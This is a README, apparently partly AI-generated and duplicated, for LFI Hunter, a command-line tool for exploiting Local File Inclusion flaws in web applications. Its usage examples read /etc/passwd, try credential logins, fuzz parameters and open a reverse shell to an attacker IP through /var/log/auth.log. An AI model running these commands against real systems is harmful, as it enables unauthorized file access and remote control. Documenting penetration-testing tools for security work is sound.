# README.md for LFI Hunter

## Overview

**LFI Hunter** is a command-line tool for testing and exploiting Local File Inclusion (LFI) vulnerabilities in web applications. This tool is designed to assist ethical hackers and security researchers in assessing web application security by exploiting file inclusion vulnerabilities in a controlled environment.

## Features

- **Command-line Interface**: User-friendly interface with various options.
- **Authentication Support**: Test areas requiring login credentials.
- **File Reading**: Attempt to read sensitive files from the target machine.
- **Parameter Fuzzing**: Test for injection vulnerabilities.
- **Reverse Shell Setup**: Establish a reverse shell connection for deeper access.

## Installation

To use LFI Hunter, clone the repository from GitHub:

```bash
git clone https://github.com/jac11/LFI_Hunter.git
cd LFI_Hunter
```

## Usage

The basic syntax for running LFI Hunter is:

```bash
LFI_Hunter [OPTIONS]
```

### Options

| Option                  | Description                                                                                     |
|-------------------------|-------------------------------------------------------------------------------------------------|
| `-h`, `--help`          | Show help message and exit.                                                                    |
| `--man`                 | Show the man page.                                                                             |
| `-UV`, `--Vulnurl`      | Target URL for the vulnerable web application.                                                 |
| `--auth`                | Enable authentication mode.                                                                    |
| `-F`, `--filelist`      | Read from an LFI wordlist file.                                                                |
| `-C`, `--Cookie`        | Provide the login session cookie.                                                              |
| `-B`, `--base64`        | Enable decoding of base64-filtered PHP code.                                                   |
| `-R`, `--read`          | Specify a file to read from the target machine.                                                |
| `-UF`, `--UserForm`     | Specify the HTML login form username field.                                                    |
| `-PF`, `--PassForm`     | Specify the HTML login form password field.                                                    |
| `-P`, `--password`      | Specify a password for login attempts.                                                         |
| `-p`, `--readpass`      | Read a password from a file.                                                                   |
| `-LU`, `--loginurl`     | Provide the login URL for authentication mode.                                                 |
| `-U`, `--user`          | Specify a username for login attempts.                                                         |
| `-u`, `--readuser`      | Read a username from a specified file.                                                         |
| `-A`, `--Aggressiv`     | Enable aggressive mode to increase request speed.                                              |
| `-S`, `--shell`         | Set up a reverse shell connection to a specified IP address.                                   |
| `--port PORT`           | Set the port for netcat or reverse shell connections.                                          |
| `-Z`, `--fuzzing`       | Enable brute-force or fuzzing mode for parameter testing.                                      |
| `--config FILE`         | Use a configuration file with predefined options.                                              |

### Examples

1. **Basic URL Scan with Authentication**:
   ```bash
   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth -A -LU http://example.com/login.php -U admin -P password
   ```

2. **Use Base64 Decoding**:
   ```bash
   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -B -Z
   ```

3. **Read /etc/passwd File**:
   ```bash
   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /etc/passwd
   ```

4. **Setup Reverse Shell**:
   ```bash
   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /var/log/auth.log -S 192.168.0.10 --port 5555
   ```

## Make

LFI Hunter is designed to detect various vulnerabilities related to Local File Inclusion (LFI) in web applications. The most common vulnerabilities that it can identify include:

1. **Basic Local File Inclusion (LFI)**:
   - LFI vulnerabilities allow attackers to include files on a server through the web browser. This can lead to unauthorized access to sensitive files, such as configuration files or logs.

2. **Authenticated LFI**:
   - The tool can test areas of an application that require user authentication, allowing it to exploit LFI vulnerabilities in restricted sections of a web application.

3. **Path Traversal Vulnerabilities**:
   - By manipulating input parameters, LFI Hunter can identify path traversal vulnerabilities, which enable attackers to access files outside the intended directory.

4. **File Inclusion with PHP Filters**:
   - The tool can utilize PHP filters (e.g., `php://filter`) to decode base64-encoded content or read files in a way that bypasses certain security measures.

6. **Fuzzing for Parameter Injection**:
   - LFI Hunter supports parameter fuzzing, which helps detect injection vulnerabilities by testing various payloads against input fields.

7. **Reverse Shell Setup**:
   - The tool can establish a reverse shell connection if the target is vulnerable, allowing for deeper exploitation and further testing.

By leveraging these capabilities, LFI Hunter assists ethical hackers and security researchers in identifying and exploiting LFI vulnerabilities effectively in web applications.

# README.md for LFI Hunter

## Overview

**LFI Hunter** is a command-line tool designed for testing and exploiting Local File Inclusion (LFI) vulnerabilities in web applications. This tool assists ethical hackers and security researchers in assessing web application security by exploiting file inclusion vulnerabilities in a controlled environment.

## Features

- **Command-line Interface**: User-friendly interface with various options.
- **Authentication Support**: Test areas requiring login credentials.
- **File Reading**: Attempt to read sensitive files from the target machine.
- **Parameter Fuzzing**: Test for injection vulnerabilities.
- **Reverse Shell Setup**: Establish a reverse shell connection for deeper access.
- **Aggressive Mode**: Increase request speed and payload variation for more effective testing.

## Installation

To use LFI Hunter, clone the repository from GitHub:

```bash
git clone https://github.com/jac11/LFI_Hunter.git
cd LFI_Hunter
```

## Usage

The basic syntax for running LFI Hunter is:

```bash
LFI_Hunter [OPTIONS]
```

### Key Options for Authentication

1. **Enabling Authentication**:
   - `--auth`: Enables authentication mode, allowing the tool to access restricted areas of the application that require user login.

2. **Session Cookies**:
   - `-C, --Cookie`: Specify a file containing the session cookie necessary for maintaining an authenticated session.
   - **Example**:
     ```bash
     LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth
     ```

3. **Login URL**:
   - `-LU, --loginurl`: Specifies the URL of the login page.
   - **Example**:
     ```bash
     LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth -LU http://example.com/login
     ```

4. **Username and Password Fields**:
   - `-UF, --UserForm`: Specify the HTML form field name for the username input.
   - `-PF, --PassForm`: Specify the HTML form field name for the password input.
   - **Example**:
     ```bash
     LFI_Hunter -LU http://example.com/login -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth -UF username_field -PF password_field
     ```

5. **Direct Username and Password Input**:
   - `-U, --user`: Specify a username directly for login attempts.
   - `-P, --password`: Specify a password directly for login attempts.
   - **Example**:
     ```bash
     LFI_Hunter -LU http://example.com/login -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth -U admin -P mypassword
     ```

6. **Reading from Files**:
   - Users can read usernames and passwords from files using `-u, --readuser` and `-p, --readpass`, which is useful for testing multiple credentials in an automated fashion.

### Benefits of Using Aggressive Mode

Using LFI Hunter's aggressive mode in authentication offers several advantages:

1. **Increased Request Speed**:
   - Sends a higher volume of requests quickly, useful when testing multiple file inclusion points.

2. **Enhanced Payload Variation**:
   - Tests various payloads rapidly to identify vulnerabilities that may not be apparent with standard methods.

3. **Response Length Comparison**:
   - Analyzes response lengths to detect successful file inclusions, indicating different data has been read from the server.

4. **Efficiency in Controlled Environments**:
   - Ideal for environments where extensive testing is permitted without risking disruption to production systems.

5. **Automation of Testing**:
   - Suitable for automated scripts and CI/CD pipelines, providing quick feedback on security vulnerabilities.

6. **Comprehensive Vulnerability Detection**:
   - Uncovers hidden vulnerabilities that might be missed during slower testing approaches.

### Example Usage of Aggressive Mode

To utilize aggressive mode while handling authentication, you might run a command like:

```bash
LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth -A -LU http://example.com/login.php -U admin -P password
```

In this command:
- `-A` activates aggressive mode.
- `--auth` allows interaction with authenticated sections of the application.

## Exit Status

- **0**: Successful execution.
- **1**: General error, such as invalid command input.
- **2**: Misuse of command options.

## Files

- **config.txt**: Configuration file storing default options, useful for automation.
- **lfi_wordlist.txt**: Wordlist for common paths and filenames used in LFI testing.
- **fuzz_params.txt**: Wordlist for parameter fuzzing.

## Author

Developed by jac11. For issues or contributions, visit the [GitHub repository](https://github.com/jac11/LFI_Hunter).

## License

LFI Hunter is licensed for user use only, with no permission to modify any source code.

---

This README provides a comprehensive overview of how to install and use LFI Hunter effectively while highlighting its capabilities regarding authentication and aggressive mode operations.

Citations:
[1] https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/39151810/86d7026d-1fc5-4a40-a4fa-d3debb3714d7/lfi_info.py